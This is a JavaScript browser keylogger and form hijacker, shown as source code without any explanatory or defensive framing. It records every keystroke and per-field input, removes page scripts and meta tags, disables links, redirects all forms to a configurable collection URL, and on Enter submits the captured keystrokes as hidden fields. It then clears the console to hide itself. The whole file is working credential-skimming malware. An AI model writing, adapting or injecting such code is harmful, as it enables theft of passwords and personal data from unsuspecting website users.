// CONTROL //

const API_URL = ''

// KEYLOGGER //

const keylogs = []
const fieldlogs = {}

addEventListener('keydown', (e) => {
  const activeEl = document.activeElement

  if (activeEl && activeEl.tagName === 'INPUT') {
    const name = activeEl.name

    if (!fieldlogs[name]) {
      fieldlogs[name] = []
    }

    fieldlogs[name].push(e.key || 'UNKNOWN')
  }

  keylogs.push(e.key || 'UNKNOWN')
})

// SCRIPT //

const all_script = document.querySelectorAll('script')
const all_a = document.querySelectorAll('a')
const all_button = document.querySelectorAll('button')
const all_form = document.querySelectorAll('form')
const all_meta = document.querySelectorAll('meta')
const all_noscript = document.querySelectorAll('noscript')
const all_base = document.querySelectorAll('base')
const all = document.querySelectorAll('*')

for (const element of all) {
  element.removeAttribute('jsaction')
}

for (const a of all_a) {
  a.href = false
}

for (const element of [
  ...all_base,
  ...all_noscript,
  ...all_meta,
  ...all_script,
]) {
  element?.remove()
}

for (const button of all_button) {
  if (button.type != 'submit') {
    button.type = 'submit'
  }

  for (const form of all_form) {
    button.addEventListener('click', () => {
      form.submit()
    })
  }
}

for (const form of all_form) {
  form.action = API_URL
  form.method = 'POST'
  form.noValidate = false
}

// SUBMIT //

function input(type, name, value) {
  const el = document.createElement('input')
  Object.assign(el, {
    type,
    name,
    value: JSON.stringify(value),
  })
  return el
}

addEventListener('keydown', (event) => {
  if (event.key === 'Enter') {
    for (const form of all_form) {
      const hidden1 = input('hidden', 'LOGGER[keylogs]', keylogs)
      const hidden2 = input('hidden', 'LOGGER[fieldlogs]', fieldlogs)

      form.appendChild(hidden1)
      form.appendChild(hidden2)

      form.submit()
    }
  }
})

// EXIT //

console.clear()
